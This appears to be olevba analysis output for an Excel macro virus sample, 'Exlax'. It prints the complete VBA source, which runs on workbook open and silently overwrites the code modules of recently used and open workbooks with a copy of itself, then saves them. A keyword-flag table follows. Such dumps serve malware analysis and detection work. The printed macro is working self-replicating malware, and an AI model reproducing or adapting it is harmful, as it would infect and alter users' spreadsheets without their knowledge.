olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Exlax
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: ./Virus.MSExcel.Exlax - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open(): On Error GoTo Wups
If Workbooks.Count > 1 Then InfMulti
Application.DisplayAlerts = False
WB = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For X = 1 To Application.RecentFiles.Count
Application.RecentFiles.Item(X).Open.Activate
With ActiveWorkbook.VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString WB
End With
ActiveWorkbook.SaveAs Filename:=ActiveWorkbook.FullName
ActiveWorkbook.Close
Next X
Wups:
End Sub
Private Sub InfMulti(): On Error GoTo Ahhh
Application.DisplayAlerts = False
WB = ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
For X = 1 To Workbooks.Count
With Workbooks.Item(X).VBProject.VBComponents.Item(1).CodeModule
.DeleteLines 1, .CountOfLines: .AddFromString WB
End With
Workbooks.Item(X).SaveAs Filename:=Workbooks.Item(X).FullName
Next X
Ahhh:
End
End Sub
'Ex-lax By Lys Kovick

-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Exlax - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Exlax - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Exlax - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

